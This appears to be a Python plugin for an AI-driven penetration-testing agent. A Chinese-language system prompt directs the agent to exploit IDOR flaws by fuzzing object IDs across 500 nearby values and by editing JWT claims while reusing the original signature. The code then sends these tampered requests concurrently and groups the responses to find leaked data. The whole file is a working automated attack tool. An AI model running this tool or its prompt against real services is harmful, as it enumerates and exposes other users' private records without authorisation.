import base64
import traceback
from hmac import new
import json
from operator import ne
from addons import request
import concurrent.futures
from threading import Lock
from config import config


prompt_detect = """
你在进行IDOR漏洞利用，你需要分析当前页面与传入参数关系，哪个参数可能控制不安全的信息泄漏。你可以根据参数类型进行以下测试：
1. 普通数字型参数，如id=1，可以尝试修改为其他数字，查看网页响应是否改变
2. 综合利用，如果你发现多个参数之间存在某些关系，比如userid与cookie中的某个值相同，也可以直接进行两者的同时修改，此时你可以直接调用request工具进行手工测试
3. 对于GraphQL端点，可以修改相应参数进行测试
4. 禁止直接对PHPSESSID参数进行测试

你必须遵循以下规则：
* 如果当前请求中需要测试的参数同样在jwt令牌中出现，请同时修改jwt令牌与需要测试的参数
* 进行IDOR测试的数据必须在请求包中存在，比如传入的是username和password，不可以测试不存在的user_id，如果测试的参数在原请求包中未找到，则停止测试。
* 可以对数字型ID参数进行IDOR测试，也可以对路径中的用户名等参数进行测试
* 模糊测试的参数应综合考虑已获取的信息与原参数，进行一定范围内的模糊测试，测试范围必须尽可能大，范围需要设置为包含500个可能数值，上下界根据已有的参数值确定，需要在已有参数附近
* 模糊测试会返回：响应：[获取该同样响应的载荷]
* 你可以对多个端点进行测试，分步完成各个端点的测试

你可以进行如下工具调用：
<tool>
    <request><![CDATA[插入{FUZZ}标签后的request,json格式]]></request>
    <value>需要进行模糊测试的参数值范围(可以是逗号连接的多个值，也可以是数值型范围，如1-100)</value>
    <type>normal</type>
</tool>
如果需要fuzz测试jwt令牌里的值，需要进行如下工具调用：
<tool>
    <request><![CDATA[插入{FUZZ}标签后的request，即把jwt令牌的值变为{FUZZ}]]></request>
    <token>jwt令牌原值</token>
    <param>需要进行fuzz的jwt令牌里的参数名</param>
    <value>需要进行模糊测试的参数值范围(可以是逗号连接的多个值，也可以是数值型范围，如1-100)</value>
    <type>jwt</type>
</tool>

fuzz标签指的是在正常request请求中相应位置插入需要fuzz的标签，如：
{"url": "http://xx/order/{FUZZ}/archive", "method": "GET", "header": {"Content-Type": "application/json", "Cookie": "xxx"}, "params": {}, "files": {}}
fuzz标签可以插在任意位置

注意：
* 如果有archive端点和receipt端点，优先对archive端点进行idor测试。
"""



def need_detect(request_json):
    return True

def simple_detect(request_json, response, param=None):
    
    if "type" in param:
        if param['type'] == 'jwt_decode':
            # 从请求中获取JWT令牌
            token = param['token']
                
            try:
                # 将JWT令牌分割成三部分
                header_b64, payload_b64, signature = token.split('.')
                
                # 解码header和payload
                
                # 补全base64字符串
                def pad_base64(s):
                    return s + '=' * (4 - len(s) % 4)
                
                # 解码header
                header_json = base64.b64decode(pad_base64(header_b64.replace('-', '+').replace('_', '/')))
                header = json.loads(header_json)
                
                # 解码payload
                payload_json = base64.b64decode(pad_base64(payload_b64.replace('-', '+').replace('_', '/')))
                payload = json.loads(payload_json)
                
                return {
                    'header': header,
                    'payload': payload,
                    'signature': signature
                }
                
            except Exception as e:
                return f"JWT解码失败: {str(e)}"
        elif param['type'] == 'jwt':

            try:
                request_json = json.loads(param['request'])
            except json.JSONDecodeError:
                return "提供的 request 模板不是合法的 JSON 格式，请检查后重试"


            token = param['token']

            authorized_pre = token.split(" ", 1)[0] if " " in token else ""
            if authorized_pre:
                token = token.split(" ", 1)[1]

            try:
                # 解码JWT令牌
                decoded_jwt = simple_detect(request_json, response, {
                    'type': 'jwt_decode',
                    'token': token
                })
                
                if isinstance(decoded_jwt, str):  # 如果返回错误信息
                    return decoded_jwt
                
                if not decoded_jwt or 'payload' not in decoded_jwt:
                    return "JWT解码失败或payload不存在"
                    
                # 获取需要测试的参数值范围
                test_values = []
                if '-' in param['value']:
                    start, end = map(int, param['value'].split('-'))
                    test_values = list(range(start, end + 1))
                else:
                    test_values = param['value'].split(',')
                
                # 存储测试结果
                results = {}
                result_info = []
                results_lock = Lock()
                
                def test_jwt_value(test_value):

                    if config.FLAG:
                        return
                    try:
                        # 修改payload中的目标参数
                        new_payload = decoded_jwt['payload'].copy()
                        new_payload[param['param']] = test_value
                        
                        # 重新编码payload
                        new_payload_b64 = base64.b64encode(json.dumps(new_payload).encode()).decode().rstrip('=')
                        new_payload_b64 = new_payload_b64.replace('+', '-').replace('/', '_')
                        
                        # 构造新的JWT令牌
                        new_token = f"{base64.b64encode(json.dumps(decoded_jwt['header']).encode()).decode().rstrip('=').replace('+', '-').replace('/', '_')}.{new_payload_b64}.{decoded_jwt['signature']}"
                        if authorized_pre:
                            new_token = f"{authorized_pre} {new_token}"
                        
                        # 发送请求并获取响应
                        new_request = json.loads(param['request'].replace("'", '"').replace("{FUZZ}", new_token))
                        new_response = request.run(new_request)
                        
                        # 简化响应内容，将测试值替换为{payload}
                        simplify_content = new_response['content'].replace(str(test_value), "{payload}")
                        
                        # 线程安全地更新结果
                        with results_lock:
                            response_found = False
                            for existing_response, values in results.items():
                                if simplify_content == existing_response:
                                    results[existing_response].append(str(test_value))
                                    response_found = True
                                    break
                            
                            # 如果是新的响应，创建新条目
                            if not response_found:
                                results[simplify_content] = [str(test_value)]
                    except Exception as e:
                        print(f"JWT测试值 {test_value} 出错: {str(e)}")
                
                # 使用10并发进行模糊测试
                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                    futures = [executor.submit(test_jwt_value, test_value) for test_value in test_values[:500]]
                    concurrent.futures.wait(futures)
                
                # 格式化结果信息
                for k in results:
                    result_info.append(f"载荷 【{','.join(results[k])}】: {k}\n")
                
                return result_info
            except Exception as e:
                return f"JWT测试过程中发生错误: {str(e)}"
        elif param['type'] == 'normal':

            try:
                request_json = json.loads(param['request'])
            except json.JSONDecodeError:
                return "提供的 request 模板不是合法的 JSON 格式，请检查后重试"

            try:
                # 获取需要测试的参数值范围
                test_values = []
                if '-' in param['value']:
                    start, end = map(int, param['value'].split('-'))
                    test_values = list(range(start, end + 1))
                else:
                    test_values = param['value'].split(',')

                # 存储测试结果
                results = {}
                result_info = []
                results_lock = Lock()

                def test_normal_value(test_value):
                    if config.FLAG:
                        return
                    try:
                        # 构造新的请求
                        new_request = json.loads(param['request'].replace("'", '"').replace("{FUZZ}", str(test_value)))

                        # 发送请求并获取响应
                        new_response = request.run(new_request)

                        # 简化响应内容，将测试值替换为{payload}
                        simplify_content = new_response['content'].replace(str(test_value), "{payload}")
                        
                        # 线程安全地更新结果
                        with results_lock:
                            response_found = False
                            for existing_response, values in results.items():
                                if simplify_content == existing_response:
                                    results[existing_response].append(str(test_value))
                                    response_found = True
                                    break

                            # 如果是新的响应，创建新条目
                            if not response_found:
                                results[simplify_content] = [str(test_value)]
                    except Exception as e:
                        print(f"Normal测试值 {test_value} 出错: {str(e)}")

                # 使用10并发进行模糊测试
                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                    futures = [executor.submit(test_normal_value, test_value) for test_value in test_values[:500]]
                    concurrent.futures.wait(futures)


                for k in results:
                    result_info.append(f"载荷 【{','.join(results[k])}】: {k}\n")
                
                return result_info

            except Exception as e:
                traceback.print_exc()
                return f"参数测试过程中发生错误: {str(e)}"
